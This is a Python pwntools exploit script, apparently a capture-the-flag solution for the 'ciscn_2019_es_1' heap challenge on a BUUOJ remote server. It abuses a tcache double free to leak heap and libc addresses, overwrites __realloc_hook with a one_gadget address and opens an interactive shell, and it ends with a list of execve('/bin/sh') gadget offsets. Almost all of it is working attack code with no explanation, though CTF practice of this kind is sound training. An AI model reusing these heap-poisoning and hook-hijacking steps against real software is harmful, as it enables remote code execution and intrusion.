#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *

context.log_level='debug'

exeFile = './ciscn_2019_es_1'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 25706

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('choice:', str(1))
	sla('name', str(size))
	sa('name:', data)
	sla('call:', '1')

def rm(idx):
	sla('choice:', str(3))
	sla(':', str(idx))

def dp(idx):
	sla('choice:', str(2))
	sla(':', str(idx))

def q():
	sla('choice:', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x80, 'A' * 0x10) # idx 0
	rm(0)
	rm(0)

	dp(0)
	ru('\x3a\x0a')
	heap = u64(ru('\x0a').ljust(0x8, '\x00')) - (0x557a6a18c280 - 0x557a6a18c000)
	li('heap : ' + hex(heap))

	ad(0x80, p64(heap + 0x10)) # idx 1
	ad(0x80, 'A') # idx 2

	p = p64(0x0600000000000000) + p64(0)
	#p += p64(0) * 13
	ad(0x80, p)
	rm(0)
	rm(0)

	dp(0)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x3ebc40 - 96
	li('libc base: ' + hex(lib.address))

	ad(0x60, 'A') # idx 4
	rm(4)
	rm(4)
	ad(0x60, p64(lib.sym['__realloc_hook']))
	ad(0x60, 'A')
	gadget = [0x4f2c5, 0x4f322, 0xe569f, 0xe5858, 0xe585f, 0xe5863, 0x10a38c, 0x10a398]
	one_gadget = lib.address + gadget[3]
	p = p64(one_gadget)
	p += p64(one_gadget)
	#p += p64(lib.sym['realloc'] + 5) # 5 6 17
	ad(0x60, p)

	#db()
	sl('1')
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe569f execve("/bin/sh", r14, r12)
constraints:
  [r14] == NULL || r14 == NULL
  [r12] == NULL || r12 == NULL

0xe5858 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
constraints:
  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe585f execve("/bin/sh", r10, [rbp-0x70])
constraints:
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe5863 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0x10a398 execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL
'''
